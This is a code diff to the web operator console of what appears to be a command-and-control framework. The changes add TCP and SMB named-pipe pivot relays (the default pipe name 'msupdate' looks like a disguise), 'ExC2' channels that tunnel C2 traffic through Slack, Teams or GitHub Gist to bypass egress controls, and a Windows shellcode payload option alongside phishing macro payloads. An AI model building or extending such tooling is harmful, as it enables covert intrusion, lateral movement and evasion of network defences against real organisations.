@@ -690,21 +690,63 @@ tr.clickable { cursor: pointer; }
 
         <!-- SMB Pivot Control -->
         <div class="card">
-          <div class="card-header"><h3><span>🔗</span> SMB Pivot</h3><span style="font-size:11px;color:var(--text-muted)">Named pipe relay</span></div>
+          <div class="card-header"><h3><span>🔗</span> Pivot Control</h3><span style="font-size:11px;color:var(--text-muted)">SMB pipe + TCP relay</span></div>
           <div class="card-body padded">
-            <p style="font-size:12px;color:var(--text-muted);margin-bottom:10px">Start a Win32 named pipe relay on this agent. Internal agents connect via <span style="color:var(--cyan);font-family:monospace">\\agent-host\pipe\&lt;name&gt;</span></p>
-            <div style="display:flex;gap:6px;margin-bottom:10px;align-items:end">
+            <!-- SMB section -->
+            <p style="font-size:11px;color:var(--text-muted);margin-bottom:6px;font-weight:600;text-transform:uppercase;letter-spacing:1px">SMB Named Pipe (Windows)</p>
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px">Internal agents connect via <span style="color:var(--cyan);font-family:monospace">\\host\pipe\&lt;name&gt;</span></p>
+            <div style="display:flex;gap:6px;margin-bottom:8px;align-items:end">
               <div style="flex:1">
                 <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Pipe Name</label>
                 <input id="pivot-pipe-name" value="msupdate" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
               </div>
             </div>
-            <div style="display:flex;gap:6px;margin-bottom:10px">
+            <div style="display:flex;gap:6px;margin-bottom:14px">
               <button class="btn" onclick="sendPivotCmd('start')" style="flex:1;padding:7px;font-size:12px">▶ Start</button>
               <button class="qbtn danger" onclick="sendPivotCmd('stop')" style="flex:1;padding:7px;font-size:12px">■ Stop</button>
               <button class="qbtn" onclick="sendPivotCmd('list')" style="flex:1;padding:7px;font-size:12px">≡ List</button>
             </div>
+            <!-- TCP section -->
+            <div style="border-top:1px solid var(--border);padding-top:12px;margin-bottom:8px">
+              <p style="font-size:11px;color:var(--text-muted);margin-bottom:6px;font-weight:600;text-transform:uppercase;letter-spacing:1px">TCP Relay (Cross-Platform)</p>
+              <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px">Bind a TCP port — works on Linux and Windows without named pipe access.</p>
+              <div style="display:flex;gap:6px;margin-bottom:8px;align-items:end">
+                <div style="flex:1">
+                  <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Bind Addr (port or host:port)</label>
+                  <input id="pivot-tcp-addr" value="4444" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+                </div>
+              </div>
+              <div style="display:flex;gap:6px;margin-bottom:10px">
+                <button class="btn" onclick="sendTCPPivotCmd('tcp-start')" style="flex:1;padding:7px;font-size:12px">▶ Start TCP</button>
+                <button class="qbtn danger" onclick="sendTCPPivotCmd('tcp-stop')" style="flex:1;padding:7px;font-size:12px">■ Stop</button>
+                <button class="qbtn" onclick="sendTCPPivotCmd('tcp-list')" style="flex:1;padding:7px;font-size:12px">≡ List</button>
+              </div>
+            </div>
             <div id="pivot-result" style="font-size:12px;font-family:monospace;color:var(--green);white-space:pre-wrap;min-height:32px"></div>
+          </div>
+        </div>
+
+        <!-- ExC2 Channels -->
+        <div class="card">
+          <div class="card-header"><h3><span>📡</span> ExC2 Channels</h3><span style="font-size:11px;color:var(--text-muted)">Alternative transports</span></div>
+          <div class="card-body padded">
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:10px">Route C2 traffic via Slack, Teams, or other SaaS channels to bypass egress controls.</p>
+            <div style="display:flex;gap:6px;margin-bottom:10px;align-items:end">
+              <div style="flex:1">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Channel</label>
+                <select id="exchannel-name" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;">
+                  <option value="slack">Slack</option>
+                  <option value="teams">Microsoft Teams</option>
+                  <option value="gist">GitHub Gist</option>
+                </select>
+              </div>
+            </div>
+            <div style="display:flex;gap:6px;margin-bottom:10px">
+              <button class="btn" onclick="sendExChannelCmd('start')" style="flex:1;padding:7px;font-size:12px">▶ Start</button>
+              <button class="qbtn danger" onclick="sendExChannelCmd('stop')" style="flex:1;padding:7px;font-size:12px">■ Stop</button>
+              <button class="qbtn" onclick="loadExChannels()" style="flex:1;padding:7px;font-size:12px">≡ List</button>
+            </div>
+            <div id="exchannel-result" style="font-size:12px;font-family:monospace;color:var(--green);white-space:pre-wrap;min-height:32px"></div>
           </div>
         </div>
       </div>
@@ -750,6 +792,9 @@ tr.clickable { cursor: pointer; }
                   <optgroup label="Phishing">
                     <option value="hta">📧 HTA Application</option>
                     <option value="vba">📧 VBA Macro</option>
+                  </optgroup>
+                  <optgroup label="Shellcode">
+                    <option value="shellcode">💉 Windows Shellcode (Donut PIC)</option>
                   </optgroup>
                   <optgroup label="Mobile">
                     <option value="android">📱 Android Payload Pack</option>
@@ -3168,6 +3213,62 @@ async function sendPivotCmd(action) {
       }
     }
     el.textContent = '⏳ Still running — check Tasks tab for output';
+  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
+}
+
+// ──── TCP Pivot Control ────
+async function sendTCPPivotCmd(action) {
+  var agent = document.getElementById('agent-select').value;
+  var el = document.getElementById('pivot-result');
+  if (!agent) { el.textContent = '✗ Select an agent first'; return; }
+  var addr = document.getElementById('pivot-tcp-addr').value.trim() || '4444';
+  var args = action === 'tcp-start' ? 'tcp-start ' + addr : action;
+  el.style.color = 'var(--text-muted)';
+  el.textContent = '⏳ Sending TCP pivot ' + action + '...';
+  try {
+    var resp = await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({agent: agent, command: 'pivot', args: args})});
+    var data = await resp.json();
+    if (data.error) { el.style.color='var(--red)'; el.textContent='✗ '+data.error; return; }
+    el.style.color = 'var(--text-muted)';
+    el.textContent = '⏳ Task queued — waiting for result...';
+    var tid = data.task_id;
+    for (var i = 0; i < 20; i++) {
+      await new Promise(r => setTimeout(r, 1500));
+      var tr = await fetch('/api/tasks'); var tdata = await tr.json();
+      var task = tdata.find(t => t.id === tid);
+      if (task && task.status === 'complete') { el.style.color='var(--green)'; el.textContent=task.output||'[done]'; return; }
+      if (task && task.status === 'error') { el.style.color='var(--red)'; el.textContent='✗ '+(task.error||task.output); return; }
+    }
+    el.textContent = '⏳ Still running — check Tasks tab';
+  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
+}
+
+// ──── ExC2 Channel Control ────
+async function sendExChannelCmd(action) {
+  var name = document.getElementById('exchannel-name').value;
+  var el = document.getElementById('exchannel-result');
+  el.style.color = 'var(--text-muted)';
+  el.textContent = '⏳ ' + action + 'ing ' + name + ' channel...';
+  try {
+    var resp = await fetch('/api/exchannel/' + action, {method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({name: name})});
+    var data = await resp.json();
+    if (data.error) { el.style.color='var(--red)'; el.textContent='✗ '+data.error; return; }
+    el.style.color = 'var(--green)';
+    el.textContent = '[+] Channel ' + name + ': ' + action + 'ed';
+  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
+}
+
+async function loadExChannels() {
+  var el = document.getElementById('exchannel-result');
+  try {
+    var resp = await fetch('/api/exchannel/list');
+    var data = await resp.json();
+    if (!data || data.length === 0) { el.style.color='var(--text-muted)'; el.textContent='No channels registered'; return; }
+    el.style.color = 'var(--green)';
+    el.textContent = data.map(c => (c.running ? '▶ ' : '■ ') + c.name).join('\n');
   } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
 }
 
